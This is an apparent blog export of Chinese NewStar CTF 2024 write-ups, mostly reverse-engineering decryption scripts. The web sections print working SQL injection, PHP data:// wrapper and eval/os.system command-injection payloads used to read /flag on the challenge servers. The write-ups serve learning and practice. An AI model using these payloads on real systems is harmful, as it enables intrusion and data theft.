/path/to/mydata  # bzip2 压缩\n\n恢复解压对应压缩方式选择解压命令：\ntar -xzvf backup.tar.gz -C /home/user/restore  # 解压 gziptar -xjvf backup.tar.bz2 -C /home/user/restore  # 解压 bzip2\n\n\n4. 覆盖已有文件（可选）如果目标目录已经有文件，需要解压时覆盖已有文件，可添加 --overwrite 选项：\ntar -xvf backup.tar -C /home/user/restore --overwrite\n\n\n5. 验证解压是否成功在解压完成后，可以使用 ls 命令检查解压后的目录结构是否正确：\nls /home/user/restore\n\n如果需要进一步验证文件完整性，可以通过 diff 比较备份前后文件的差异：\ndiff -r /path/to/original /home/user/restore\n\n6.下载与上传\n使用Tabby的SFTP进行操作。\n","categories":["学习"],"tags":["学习"]},{"title":"2024CtfNewStar Week1 Re&Web-wp","url":"/2024/10/26/CTFNewStar2024-Week1-wp/","content":"reverse(・∀・)つ原题 \nbase64Die 发现是 PE64，直接丢入 ide64，函数名混乱，直接 shift+f12，查找用”Enter the flag: “ 进入主函数，发现输入的值 str 为 26 位然后被 sub_7FF706EE14E0(Str, 26, Str1)加密输出为 str1，再与 g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;比较相等即 str 是 flag 值.进入sub_7FF706EE14E0()函数，再由题目提示的 base64 丁帧为 base64 加密函数，并找到了一个字符串 WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ&#x2F; ,一眼就是密钥 .\n直接用密钥 base64 解密得 flag\n\nezAndroidStudyapk 先安装看一看，全是提示就跟着提示来activity 有个 work.pangbai.ezandroidstudy.Homo 的页面,直接搜索进入拿下 flag 第一段 flag{Y0u发现flag字符转被定义在一个名为flag1的变量里，于是推测有flag2,直接搜索 flag2，拿下flag2的值为 _@r4。同样搜索 flag3，直接拿下 flag3 的值为_900d。flag4 在提示的目录下为_andr01d.第五步提示要逆向 so 文件（c 语言），于是找到在 lib&#x2F;arm64-v8a 下的so 文件，提取出来直接丢入 ida64，shift+f12 在libezandroidstudy.so 文件中找到最后flag，_r4V4rs4r}\n\nSimple_encryption查壳拖进 ida64，简单的算法，脚本如下\n#include&lt;stdio.h&gt;int main() &#123;unsigned char buffer[32] = &#123;0x47, 0x95, 0x34, 0x48, 0xA4, 0x1C, 0x35, 0x88, 0x64, 0x16, 0x88, 0x07, 0x14, 0x6A, 0x39,0x12,0xA2, 0x0A, 0x37, 0x5C, 0x07, 0x5A, 0x56, 0x60, 0x12, 0x76, 0x25, 0x12, 0x8E, 0x28, 0x00,0x00&#125;;for (int i = 0; i &lt; 32; i++) &#123;if (i % 3 == 0) &#123;buffer[i] += 31;continue;&#125;if (i % 3 == 1) &#123;buffer[i] -= 41;continue;&#125;if (i % 3 == 2) &#123;buffer[i] ^= 0x55u;&#125;&#125;printf(&quot;%s&quot;, buffer);&#125;\n输出 flag{IT_15_R3Al1y_V3Ry-51Mp1e}\n\nez_debug用 ida 看了一下代码，发现最后有个输出是解密 flag 的，但是并没有发现加密的 flag 值，于是就用 ida 动态调试看值，但是 ida 中的编译代码很乱，难以看懂，比较的两个值也不是 flag 加密的值，所以尝试跳过比较去直接输出 Decrypted flag，然而并没有东西。再 看 题 目 发 现 提 示 用 xdbg ， 于 是 用 xdbg 调 试 ， 在 0000000000401CB3 的 je0x0000000000401CD9 处断点修改 ZF 的值为 0，使其执行 right 部分的代码，再在输出Decrypted flag 的后面断点，发现 flag 已经在右侧显示出来了flag{y0u_ar3_g0od_@_Debu9}\n\nbegin全程提示Main 函数中 F5 后点击&amp;flag_part1，按 a 转换字符串Shift+f12，看到第二部分定位字符串的函数，然后按 x 再定位到调用的函数，函数名就是 flag 的第三部分flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}\n\nWebPangBai 过家家（1）跟随提示Leve1 在请求头的 localtion 中找到868f4249-8170-4ece-909b-36ad36e6037f，直接输入跳转地址Get 传参 ？Ask&#x3D;miaoPost say&#x3D;helloPost say&#x3D;flag提示 Agent 为 Papa，修改请求头 User-Agent 为 Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64)AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Papa&#x2F;129.0.0.0 Safari&#x2F;537.36Post say&#x3D;玛卡巴卡阿卡哇卡米卡玛卡呣提示上传文件，在本地电脑上创建一个任意名字的 zip 压缩包，并将 cookie 复制到postman，再用 postman 以 PACTH 方式上传压缩包，提示“玛卡巴卡阿卡哇卡米卡玛卡呣”必不可少，于是再上传一个 key 为 say 的 text 句子，value 为玛卡巴卡阿卡哇卡米卡玛卡呣。提示 jwt，密钥为 0ZmeYwg8aIgb2jVC，了解到可以 jwt 伪造，先对当前 cookie 解密发现有一个 level：6 的内容，但是不知道伪造的值是多少，先尝试修改为 7，输入后不通过，后看剧情猜测可能是 0，于是修改为 0，直接通过。提示要成为 Pangbai 的家人，Localhost，使用 hackbar 直接添加 X-Forwarded-For 的值为Localhost点击页面上的按钮获取 flag\n\nHeadach3提示 header，F12 看请求头，一眼 flag，flag{You_Ar3_R3Ally_A_9ooD_d0ctor}\n\n会赢吗F12 查看源码，发现 flag 第一部分 ZmxhZ3tXQTB3 和&#x2F;4cqu1siti0n，转入&#x2F;4cqu1siti0n，提示 js 的用法，于是查看 js 脚本源码，发现了 async functionrevealFlag(className)这个函数请求一个 classname 的参数，并看到了控制台的提示课程名为 4cqu1siti0n。但是发现原页面并没调用这个段 js 脚本，于是在控制台手动调用，输入 revealFlag(“4cqu1siti0n”);,成功拿到第二段 flag 为 IV95NF9yM2Fs，并提示前往&#x2F;s34l。查看源码，发现有获取 flag 的 js 脚本，分析只要 stateElement.textContent &#x3D;&#x3D;&#x3D; ‘解封’,就可以运行 js，于是在 if 判断处断点，在控制台输入 stateElement.textContent&#x3D;”解封”，把值修改为正确的值，运行后得 flag 为 MXlfR3I0c1B，提示下一关在&#x2F;Ap3x，转到&#x2F;Ap3x，发现有 js 脚本阻止我们提交按钮，直接在浏览器设置中禁用 js，再点击按钮获得 flag\n\n智械危机根据题目提示的 robot，访问 robots.txt，提示&#x2F;backd0or.php转到&#x2F;backd0or.php，进入后发现是 php 代码，分析代码发现要 POST 两个参数 cmd 和 key。并且有个execute_cmd()函数中有 system()函数，于是想办法把 linux 指令传入system 中执行。再细致分析 If 判断就会执行 execute_cmd()，于是先看decrypt_request()函数，这个函数的返回值是 cmd 的 base64 解码的值，所以我们要先把我们要执行的命令（cmd）进行 base64 编码，再函数内部会把我们的 cmd值进行反转并取 md5 值，并和被 base64 解码的 key 值比较，相等就会 return。所以我们的操作就是:选取 linux 命令的值–&gt;把值进行 base64 编码–&gt;post 传入 cmd 中–&gt;反转 cmd(反转的脚本如下)–&gt;把反转的 cmd 进行 md5–&gt;进行 base64 编码–&gt;POST 传入key 中.找 flag 的 位 置 (ls &#x2F;)，harkbar POST 传 入\ncmd=bHMgLw==&amp;key=ZTk0ZDNmOWQyNzBmNTczNGMwZTYwNDY3ZDQ0ZTdkNDY=\n发现名为 flag 的 文 件 ， 直 接 用 cat &#x2F;flag 打 开 ， 所 以 要 传 入\ncmd=Y2F0IC9mbGFn&amp;key=ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=\nflag{b302ad78-b283-431a-8ad5-2a24702d218c}\ndef reverse(s):return s[::-1]print(reverse(&quot;&quot;))\n\n谢谢皮蛋xxxxxxxxxx \\157\\163\\56\\163\\171\\163\\164\\145\\155\\50\\47\\143\\141\\164\\40\\57\\146\\154\\141\\147\\47\\51s\n-1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database();#\n里面发现有一个Fl4g 的表，但是不知道里面的列名，所以继续查找列名,输入\n-1 union select 1,group_concat(column_name) from information_schema.columns;#\n查找列名有点多，可以搜索关键词 flag，发现里面有 FLAG 的列和一些其他的列名,输入\n-1 union SELECT 1,FLAG FROM Fl4g;#\n获取 flag 值显示没有这个列表，说明 FLAG 不是存放 flag 的地方。注意到刚刚查出来的列里面 FLAG 旁边有一个叫 value 的列，猜测可能是，所以输入\n-1 union SELECT 1,value FROM Fl4g;# \nflag{89437dd4-53f9-4bb9-8702-ad94e1580be1}\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2024CtfNewStar Week3 Re&Web-wp","url":"/2024/10/28/CTFNewStar2024-Week3-wp/","content":"Reverse(・∀・)つ原题 \nsimpleAndroid打开后发现了一个checkActivity的文件里发现我们输入的字符串被传到了so文件里加密，于是解压出so文件丢入ida分析，找到了一个datacheck函数，一进去就发现了一个base64编码和编码密钥。加密代码看似很多其实总共就两次，一次是反转，还有一次是一个”|”和”&amp;”运算，把反转后的字符串逐个进行运算，最后和密文进行比较。直接抄下来就行，解密脚本反一下就行，先运算后反转（脚本如下）最后用密钥在赛博厨师解base64编码就行。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char data_1[32] = &#123;    0xB2, 0x74, 0x45, 0x16, 0x47, 0x34, 0x95, 0x36, 0x17, 0xF4, 0x43, 0x95, 0x03, 0xD6, 0x33, 0x95,    0xC6, 0xD6, 0x33, 0x36, 0xA7, 0x35, 0xE6, 0x36, 0x96, 0x57, 0x43, 0x16, 0x96, 0x97, 0xE6, 0x16&#125;;void res1(unsigned char* m, int len) &#123;    for (int i = 0; i &lt; len; ++i) &#123;        m[i] = (m[i] &gt;&gt; 4) &amp; 0x0F | (16 * m[i]) &amp; 0xF0;    &#125;&#125;void res2(unsigned char* m, int len) &#123;    for (int i = 0; i &lt; len / 2; ++i) &#123;        unsigned char temp = m[i];        m[i] = m[len + ~i];        m[len + ~i] = temp;    &#125;&#125;int main() &#123;    int len = sizeof(data_1) / sizeof(data_1[0]);    res1(data_1, len);    res2(data_1, len);    for (int i = 0; i &lt; len; ++i) &#123;        printf(&quot;%c&quot;, data_1[i]);    &#125;    return 0;&#125;\n\n\n取啥名字好呢？Ida分析发现main函数里套了许多的signal函数，查询了一下发现是收集异常的函数，然后在第一个signal（注意到报错是8，也就是SIGFPE）函数里找到了一段加密代码，大概就是异或下标吧，之后会把密文比较判断。打算先猜一手，先提取出密文，写出异或解密脚本后发现不正确，于是用动调看input的值的变化，发现input的所有值在第一次报错8之前被统一更改了，后面就是正常地报错8，进行异或下标加密。输入不同的字符发现改变前后的差是统一的，当我输入0x31时发现数据被转成0xa1,那么就是我输入的字符被减去了0x17,所以写出脚本，输出的就是flag.\n#include &lt;stdio.h&gt;unsigned char m[23] = &#123;    0x4F, 0x54, 0x48, 0x53, 0x60, 0x45, 0x37, 0x1A, 0x28, 0x41, 0x26, 0x16, 0x3B, 0x45, 0x14, 0x47,    0x0E, 0x0C, 0x70, 0x3B, 0x3C, 0x3D, 0x70&#125;;int main() &#123;    for (int i = 0; i &lt; 23; i++) &#123;        m[i] ^= i;        printf(&quot;%c&quot;, m[i] + (0x31 - 0x1a));    &#125;&#125;\n\n\nflowering_shrubsdie发现是fle64文件，ida分析天崩开局全是花，不会用pythonida脚本去画捏，手动去花，nop掉push和ret之前的内容(包含有call $+5),识别成函数后就是正常内容。分析函数，加密过程大概就是把明文字符四个一组然后在组内分别与key中的一个字符进行异或和运算加密，而加密的顺序据取决于一个随机数生成的下标，这决定了一个组的密钥。  分析随机数的生成，种子是0，但是是在Linux的文件，因为wind和linux的随机数生成不同，我们要写一份生成随机数的代码到Linux进行生成（脚本1）。在生成随机数时会舍弃掉一次生成的第一个数，之后若生成与之前相同的数就会重复生成直到不重复（在这个过程中不会跳过第一个生成的数），不知道为什么在winds写的代码在Linux里面运行有问题，无奈把随机数全部生成（200个）然后用上面的逻辑，自己手动整理，最后得到的就是加密的下标顺序（index）。有了每个的加密顺序就直接反向解密就行。（脚本2）\n//脚本1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char* argv[]) &#123;    int rands;    srand(0);    for (int i = 0; i &lt; 10; i++) &#123;                rands = (rand() % 40) &amp; 0xFC;        printf(&quot;%d,&quot;, rands);    &#125;    return 0;&#125;\n//脚本2#include &lt;stdio.h&gt;unsigned char m[40] = &#123;    0x54, 0xF4, 0x20, 0x47, 0xFC, 0xC4, 0x93, 0xE6, 0x39, 0xE0, 0x6E, 0x00, 0xA5, 0x6E, 0xAA, 0x9F,    0x7A, 0xA1, 0x66, 0x39, 0x76, 0xB7, 0x67, 0x57, 0x3D, 0x95, 0x61, 0x22, 0x55, 0xC9, 0x3B, 0x4E,    0x4F, 0xE8, 0x66, 0x08, 0x3D, 0x50, 0x43, 0x3E&#125;;int index[] = &#123;0,4,32,12,8,24,16,20,28,36&#125;;int dec(unsigned char* input, unsigned char *key) &#123;    *input ^= input[3];    input[3] ^= input[2];    input[2] += *key;    input[2] ^= input[1];    input[1] -= *key;    input[1] ^= *input;    *input ^= *key;    return 0;&#125;int main() &#123;    unsigned char key[] = &quot;uarefirst.&quot;;    for (int i = 0; i &lt; 10; i++) &#123;        dec(&amp;m[index[i]], &amp;key[i]);    &#125;    printf(&quot;%s&quot;, m);        return 0;&#125;\n\nSMc_mathIda分析发现里面代码就是一坨，看题目是smc，于是先寻找解密代码，发现在调用加密函数前，有一个for循环对加密函数进行了异或运算，这估计就是解密加密函数的代码，于是在调用处断点。进行动调，到断点处用快捷键恢复函数，这样就可以看到加密函数的内容了。分析函数，就是一个七元一次方程，查找资料想到用z3库来解密，脚本如下。因为加密时以int转入，解方程后的结果应该是4字节数据16进制转化成了数字表示，因为数据是4字节小端序存储，所以我们要用小端序读取并转成字符就可以了（脚本如下）。\nfrom z3 import *v2, v3, v4, v5, v6, v7, v8 = Ints(&#x27;v2 v3 v4 v5 v6 v7 v8&#x27;)a = Solver()a.add(5 * (v3 + v2) + 4 * v4 + 6 * v5 + v6 + 9 * v8 + 2 * v7 == 0xD5CC7D4FF)a.add(4 * v8 + 3 * v5 + 6 * v4 + 10 * v3 + 9 * v2 + 9 * v7 + 3 * v6 == 0x102335844B)a.add(9 * v6 + 4 * (v5 + v4) + 5 * v3 + 4 * v2 + 3 * v8 + 10 * v7 == 0xD55AEABB9)a.add(9 * v3 + 5 * v2 + 9 * v8 + 2 * (v4 + 2 * v5 + 5 * v6 + v7) == 0xF89F6B7FA)a.add(5 * v6 + 9 * v5 + 7 * v2 + 2 * v3 + v4 + 3 * v8 + 9 * v7 == 0xD5230B80B)a.add(8 * v8 + 6 * v5 + 10 * v4 + 5 * v3 + 6 * v2 + 3 * v7 + 9 * v6 == 0x11E28ED873)a.add(v2 + 4 * (v4 + v3 + 2 * v5) + 9 * v6 + v7 + 3 * v8 == 0xB353C03E1)che = a.check()res = a.model()print(res)m = [1734437990, 1596998779, 1601515609, 1999662667, 1129149279, 1148073055, 2100517471]  # 手动收集的数据，因为不会把res中的计算结果转化为列表flag = &quot;&quot;for i in m:    result = i.to_bytes(4, &#x27;little&#x27;)  #     flag += result.decode(&#x27;utf-8&#x27;)print(flag)\n\nSecretsOfKawaiiJeb解混淆，在mainacticity里面发现了加密代码，在这里主要逻辑就是把明文rc4加密（密钥就在旁边），然后base64编码后交到so层check方法处理。提取出so文件，查壳发现带壳，后用upx脱壳，然后丢进ida分析。找到一个带check的函数，里面有一个btea函数和密钥，分析btea函数，是一个xxtea加密和密文，把密文用ida提取。和网上的xxtea加密对比发现delta被修改了，把在网上找到的解密代码的delta进行修改，就可以写出解密脚本（脚本如下）。把解密后的字符串进行base64编码再rc4解密，密钥是rc4k4y，(http://tool.chacuo.net/cryptrc4)，直接输入base64编码就可以解密出结果，结果就是flag\n#include &lt;stdio.h&gt;unsigned char secrets[48] = &#123;    0xDF, 0xD3, 0x12, 0x8C, 0x37, 0x41, 0x4C, 0x5F,      0x02, 0x3D, 0x9D, 0x1A, 0xB7, 0x94, 0x12, 0x2D,     0x37, 0x2B, 0x62, 0xFB, 0xE3, 0x84, 0x8D, 0xD1,     0x92, 0x45, 0x4C, 0x06, 0xAB, 0x5C, 0x98, 0x16,     0x69, 0x6D, 0xB0, 0xFD, 0xE3, 0xB1, 0x30, 0xFB,     0xD3, 0x2F, 0x5C, 0x92, 0x0C, 0xB4, 0x1B, 0x2E, &#125;;__int64 __fastcall dec2(unsigned int* input, int n, const unsigned int* key)  &#123;    int e;     int rounds;     unsigned int p;     unsigned int delta;    unsigned int z;     unsigned int y;    rounds = 52 / n + 6;    unsigned int sum;    delta = 559038737;     sum = 0 - delta * rounds;     y = input[0];    do    &#123;        e = (sum &gt;&gt; 2) &amp; 3;        for (p = n - 1; p &gt; 0; p--)        &#123;            z = input[p - 1];            y = input[p] -= (((z ^ key[e ^ p &amp; 3]) + (y ^ sum)) ^ (((4 * z) ^ (y &gt;&gt; 3)) + ((8 * y) ^ (z &gt;&gt; 5))));        &#125;        z = input[n - 1];        y = input[0] -= (((z ^ key[e ^ p &amp; 3]) + (y ^ sum)) ^ (((4 * z) ^ (y &gt;&gt; 3)) + ((8 * y) ^ (z &gt;&gt; 5))));        sum += delta;    &#125; while (--rounds);    return rounds;&#125;int main() &#123;    unsigned char key[] = &quot;meow~meow~tea~~~&quot;;    dec2((unsigned int*)secrets, 12, (const unsigned int*)key);     for (int x = 0; x &lt; 48; x++) &#123;        printf(&quot;%c&quot;, secrets[x]);     &#125;    return 0;&#125;\n011vmollvm平坦化，可以用d810，去一下混淆，效果也不是很好，主要就是猜。在main函数中可以跟踪一下输入的变量，发现进入了一个函数，查看这个函数，里面有三个128位个字符，里面又发现一个函数，发现这个函数的内容有点像tea加密，对比一下原tea加密代码，好像没有魔改，于是我们把数据提取出来，因为没有发现其他的字符为密钥，推测密钥就在那三个长字符中，刚好满足tea的加密数据格式(4个32位的密钥，和偶数个32位的加密数据),直接进行解密就可以得到结果。\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void encrypt(uint32_t* v, uint32_t* k) &#123;\tuint32_t v0 = v[0], v1 = v[1], sum = 0, i;\tuint32_t delta = 0x9e3779b9;\tuint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];\tfor (i = 0; i &lt; 32; i++) &#123;\t\tsum += delta;\t\tv0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);\t\tv1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);\t&#125;\tv[0] = v0; v[1] = v1;&#125;void decrypt(uint32_t* v, uint32_t* k) &#123;\tuint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i;\t\tuint32_t delta = 0x9e3779b9;\tuint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];\tfor (i = 0; i &lt; 32; i++) &#123;\t\tv1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);\t\tv0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);\t\tsum -= delta;\t&#125;\tv[0] = v0; v[1] = v1;&#125;int main()&#123;\tunsigned char k[] = &#123;\t0x14, 0x13, 0x12, 0x11, 0x25, 0x24, 0x23, 0x22, 0x36, 0x35,\t0x34, 0x33, 0x44, 0x43, 0x42, 0x41\t&#125;;\tunsigned char v[] =\t&#123;\t  0x28, 0x7E, 0xB9, 0x38, 0xC1, 0x10, 0xE5, 0xB7, 0xAE, 0x9F,\t  0xB2, 0xB4, 0xD7, 0xBB, 0x93, 0x55, 0x9E, 0x9B, 0x2E, 0x3C,\t  0x37, 0xC6, 0x71, 0x16, 0xB5, 0x8C, 0x3A, 0x8F, 0x15, 0xE5,\t  0x16, 0x51\t&#125;;\tfor (int i = 0; i &lt; 8; i += 2) &#123;\t\tdecrypt(((uint32_t*)v + i), (uint32_t*)k);\t&#125;\tprintf(&quot;%s&quot;, v);\treturn 0;&#125;\n\n\nPangBai 过家家（3）：用pyinstxtractor进行解包exe文件，再用pycdc提取NotNormalExe.pyc文件，发现代码逻辑不完整并有提示WARNING: Decompyle incomplete，可能是编译不了，于是想到去查看字节码，找ai帮我写了一个用pythondis库查看字节码的脚本（脚本1），看不懂py的字节码，于是丢给ai让它帮我反汇编成代码，这下看到了源码就是完整的了，加密逻辑比较简单就是普通的异或，直接写出脚本就可以解密成功了（脚本2）。\n# 脚本1import marshalimport disimport osdef disassemble_pyc(file_path):    with open(file_path, &#x27;rb&#x27;) as f:        f.read(16)        code_obj = marshal.load(f)        dis.dis(code_obj)pyc_file = r&#x27;D:\\Userdata\\download\\pycdc\\NotNormalExe.pyc&#x27;disassemble_pyc(pyc_file)\n脚本2from pwn import xorenc = [40, 9, 22, 52, 15, 56, 66, 71, 111, 121, 90, 33, 18, 40, 3, 13, 80, 28, 65, 68, 83, 88, 34, 86, 5, 12, 35, 82, 67, 3, 17, 79]key = &quot;NewStar2024&quot;for x in range(len(enc)):    enc[x] ^= ord(key[x % len(key)])flag = &quot;&quot;for x in enc:    re = x.to_bytes(1, &quot;big&quot;)    flag += re.decode(&#x27;utf-8&#x27;)print(flag)\n\nWebInclude MePhp伪协议，发现很多东西都被过滤了，查了资料看到data协议没有被过滤，至于执行命令可以用base64编码，想用&lt;?php system(“ls &#x2F;“);&gt;查看目录但发现&#x3D;被过滤了，所以尝试在base64编码下不含等号的命令。注意到flag被过滤了，推测flag的文件名就是flag，就尝试直接cat &#x2F;flag，构造&lt;?php system(“cat &#x2F;flag”);&gt;，刚好编码后又没有含有&#x3D;，直接执行，http://eci-2ze4q7yfeafl0jdgf4b6.cloudeci1.ichunqiu.com/?me=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs+\n臭皮的计算机在源码中看到了python源码，发现了eval（）函数，想到传入命令给eval执行，但是字母被过滤了，寻找只有数字的表示方法。查询资料了解到八进制的转译符是\\不包含字母，于是用八进制传入命令，用os.system()函数来执行Linux系统命令.先用ls &#x2F;看看目录，输入\n\\157\\163\\56\\163\\171\\163\\164\\145\\155\\50\\47\\154\\163 /\\47\\51\n发现flag文件，直接cat &#x2F;flag,传入\n\\157\\163\\56\\163\\171\\163\\164\\145\\155\\50\\47\\143\\141\\164\\40\\57\\146\\154\\141\\147\\47\\51\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2024CtfNewStar Week4 Re-wp","url":"/2024/11/23/CTFNewStar2024-Week5-wp/","content":"MY_ARM用ida打开我们就可以发现输入，跟踪数据，就可以找到对比函数和加密函数，里面有密钥和密文。加密函数就是一个原生的tea加密，去解密，发现解密的是错误的，于是我们进行动调寻找，被修改的密文和密钥。用qume虚拟机运行程序\nqemu-arm -g 23946 文件\n再次查看就可以找到被修改的密文和密钥,直接tea解密就行，值得注意的是在这个tea解密时，v1,v2的数据类型应该是int确保要有符号\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int decrypt(uint32_t* v, uint32_t* k) &#123;\tint sum = 0x9E3779B9 * 32;\tint v0 = v[0], v1 = v[1],  i;\t\tuint32_t delta = 0x9E3779B9;\tuint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];\tfor (i = 0; i &lt; 32; i++) &#123;\t\tv1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);\t\tv0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);\t\tsum -= delta;\t&#125;\tv[0] = v0; v[1] = v1;\treturn 0;&#125;int main()&#123;\tuint32_t v[] = &#123; 0xA0F8CB44, 0xF82F83CF, 0xA55E48C2, 0x7A26E00A, 0xF1E354C9, 0x687D9915, 0xF88816E8, 0x90878E86,\t0x3AB06298, 0xCBCFE78B, 0x578F0F50, 0xC39E3C65, 0xBBE92B84, 0x128A2CA2, 0xDB8F03F5, 0x8482F8E2 &#125;;\tuint32_t k[4] = &#123; 0x11223344, 0x55667788, 0x9900AABB, 0xCCDDEEFF &#125;;\tfor (int i = 0; i &lt; 16; i += 2) &#123;\t\tdecrypt(v+i, k);\t&#125;\tfor (int i = 0; i &lt; 64; i++) &#123;\t\tprintf(&quot;%c&quot;, *((unsigned char*)v + i));\t&#125;\treturn 0;&#125;\n\nohn_flutter!!!用blutter进行解包，在”asm\\ohn_flutter”目录下，把这个文件夹在vscode里面打开，我们可以看到汇编形式的源代码，可以尝试用关键的字符串搜索，找到程序的主逻辑处。然后我们可以读汇编中调用的函数，和一些关键参数，来查看加密函数的名字，和地址。然后在ida中分析。搜索字符串，发现主逻辑在一个_bulid的函数里面，用地址在ida中找到这个函数，发现是一坨，也不好找到逻辑。于是回到汇编中继续往下看，这个时候我们看到了一个”key”,但是查找后也没有什么收获。继续往下看我们看到一个函数里面调用了许多加密函数，用ida分析，这就是加密的主函数，一下就看到一个AES加密。这里面有些函数出现了很多次，感觉是程序自带的函数，把这些函数排除后，我们一个个进去看，在”ohn_flutter_doi_::jumppp_2fe3c8()”深入挖掘，我们还可以看到在”ohn_flutter_drink_drink::_encryptUint32List_2fe5ec()”函数里面有XXTEA加密的特征，在下图的上面还有一个”v18 &#x3D; v14 &#x2F; v16 + 6;”往后面看，只有一个base64加密，再后面就没有其他加密方法了。接下来的步骤就是找出密文和密钥，以及iv。\n在这里我们需要一个真机来进行ARM调试，用frida进行hook或者IDA调试。这里我们用frida进行hook。\n首先我们来hookXXtea的密钥，根据XXtea的加密逻辑，我们可以知道密钥的偏移量里面有一个”&amp;3”,我们找到这里。但是偏移量有点大，所以我们直接在寄存器里找密钥，在汇编里找到和+16有关x29的寄存器，很显然就是X12。然后我们把地址复制下来，就可以写hook脚本读取寄存器数值了，脚本如下。用类似的方法可以拿到AES加密的密钥和iv。最后我们要找密文。密文其实在java层里，但是最后有一个check函数，在这个函数里面一定会把密文传入比较，所以我们同样可以用上面的方法获取寄存器的值来获取密文，只不过我们要猜一下是哪个寄存器。\nconst ShowNullField = false;const MaxDepth = 5;var libapp = null;Interceptor.attfunction onLibappLoaded() &#123;    const fn_addr = 0x2FE7F0;   //填写地址偏移    Interceptor.attach(libapp.add(fn_addr), &#123;        onEnter: function () &#123;            var r1 = this.context.x12;  //x12是要打的印寄存器            console.log(r1)            console.log(hexdump(ptr(r1), &#123; length: 100, ansi: true &#125;))  //打印寄存器        &#125;    &#125;);&#125;function tryLoadLibapp() &#123;  //初始化    libapp = Module.findBaseAddress(&#x27;libapp.so&#x27;);    if (libapp === null)        setTimeout(tryLoadLibapp, 500);    else        onLibappLoaded();&#125;tryLoadLibapp();\n\njun…junkcode？打开后去除一个jz，jnz的花指令。我们可以看到main函数的加密流程，就是一个对表的异或和加减，写出解密脚本发现答案并不正确，结合题目来看我们再次去仔细的看看main前面的其他函数，同时我们也可以看看import，里面导入了许多WindowsAPI的函数。在开头，我们可以看到一个sub_4017A9(“%43s”, byte_408A40);函数，这个函数里面藏了一些东西，\nBOOL sub_4017A9(const char *a1, __int64 a2, ...)&#123;  _UNKNOWN *retaddr;  //一个地址指针，存储了main函数call的返回地址，即call的下一个地址  scanf(a1, a2);  //获取输入  *((_QWORD *)qword_408A20[0] + 1) = &amp;retaddr;  //记录返回地址到变量中  CreateProcessA(ApplicationName, 0LL, 0LL, 0LL, 0, 0, 0LL, 0LL, &amp;StartupInfo, (LPPROCESS_INFORMATION)&amp;hObject); //以ApplicationName创建一个子进程，把句柄保存到hObject  WaitForSingleObject(hObject, 0xFFFFFFFF); //等待句柄记的结束，0xFFFFFFFF表示等待时间为无限，  UnmapViewOfFile(qword_408A20[0]); //取消文件映射  CloseHandle(qword_408A70);  //关闭句柄  CloseHandle(hObject);//关闭hObject句柄  return CloseHandle(*(&amp;hObject + 1)); //关闭句柄&#125;\n这里涉及到了文件映射的概念，UnmapViewOfFile(qword_408A20[0]); 这个函数取消了一个文件映射，我们查看qword_408A20[0]这个文件的交叉引用，我们可以找到另一个函数sub_401550()。\n\nWindows文件映射:创建并打开一个文件，把这个文件映射到内存中，通过读写这个文件以达到让不同进程共享内存的目的。\n\nDWORD sub_401550()&#123;  DWORD *v0; // rbx  DWORD result; // eax  __int64 Buffer; // [rsp+30h] [rbp-50h] BYREF  HANDLE hProcess; // [rsp+38h] [rbp-48h]  qword_408A70[0] = OpenFileMappingA(0xF001Fu, 0, &quot;jun...junkcode?&quot;);  //打开一个名为jun...junkcode?的映射对象，返回文件的句柄  if ( qword_408A70[0] ) //判断是否打开成功  &#123;    qword_408A20[0] = MapViewOfFile(qword_408A70[0], 0xF001Fu, 0, 0, 0x18uLL);//把映射对象映射到内存中，返回一个指针    if ( DebugActiveProcess(*(_DWORD *)qword_408A20[0]) ) //映射内存中的进程进行调试    &#123;      hProcess = OpenProcess(0x1F0FFFu, 0, *(_DWORD *)qword_408A20[0]);//打开进程并获得所有的控制权限      Buffer = *((_QWORD *)qword_408A20[0] + 2); //赋值      WriteProcessMemory(hProcess, *((LPVOID *)qword_408A20[0] + 1), &amp;Buffer, 8uLL, 0LL);//写内存，把buffer的值写入*((LPVOID *)qword_408A20[0] + 1)中      DebugActiveProcessStop(*(_DWORD *)qword_408A20[0]);//停止调试    &#125;    UnmapViewOfFile(qword_408A20[0]);//取消映射内存    CloseHandle(qword_408A70[0]);//关闭句柄    CloseHandle(hProcess);//关闭句柄    exit(0);//推出进程  &#125;  GetModuleFileNameA(0LL, ApplicationName, 0x104u);//获取当前程序路径  qword_408A70[0] = CreateFileMappingA((HANDLE)0xFFFFFFFFFFFFFFFFLL, 0LL, 4u, 0, 0x18u, &quot;jun...junkcode?&quot;);//创建映射文件对象  qword_408A20[0] = MapViewOfFile(qword_408A70[0], 0xF001Fu, 0, 0, 0x18uLL);//映射文件到内存中  *((_QWORD *)qword_408A20[0] + 2) = 4201097LL;//把4201097LL;赋值给*((_QWORD 